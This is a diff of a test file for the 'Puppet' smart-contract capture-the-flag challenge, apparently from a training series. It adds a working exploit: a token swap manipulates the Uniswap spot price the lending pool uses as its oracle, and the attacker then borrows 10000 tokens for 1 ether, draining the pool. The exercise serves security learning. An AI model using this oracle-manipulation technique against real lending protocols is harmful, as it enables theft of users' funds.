@@ -93,22 +93,46 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+       // const price = calculateTokenToEthInputPrice(
+       //          ether('1'),
+       //          UNISWAP_INITIAL_TOKEN_RESERVE,
+       //          UNISWAP_INITIAL_ETH_RESERVE
+       //      )
+       // console.log(price.toString())
+
+        const tokensForSale = ether('3');
+        const minEth = ether('2');
+
+        const deadline = (await web3.eth.getBlock('latest')).timestamp * 4;
+         await this.token.approve(
+            this.uniswapExchange.address,
+            tokensForSale,
+            { from: attacker }
+        );
+        await this.uniswapExchange.tokenToEthTransferOutput(minEth,tokensForSale,deadline,attacker,{from:attacker});
+     
+        const oracle = await this.lendingPool.computeOraclePrice();
+        console.log(oracle.toString())
+        await this.lendingPool.borrow(ether('10000'),{from:attacker,value:ether('1')});
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         
-        // Attacker has stolen all tokens from the pool
+        // // Attacker has stolen all tokens from the pool
         expect(
             await this.token.balanceOf(attacker)
         ).to.be.bignumber.gte(POOL_INITIAL_TOKEN_BALANCE);
+        
         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.bignumber.eq('0');
         
-        // Attacker ETH balance has not decreased
+       // Attacker ETH balance has not decreased
         expect(
             await balance.current(attacker)
         ).to.be.bignumber.gte(this.intialAttackerEthBalance);
     });
 });
+// +10000000000000000000000
+// -100000000000000000000
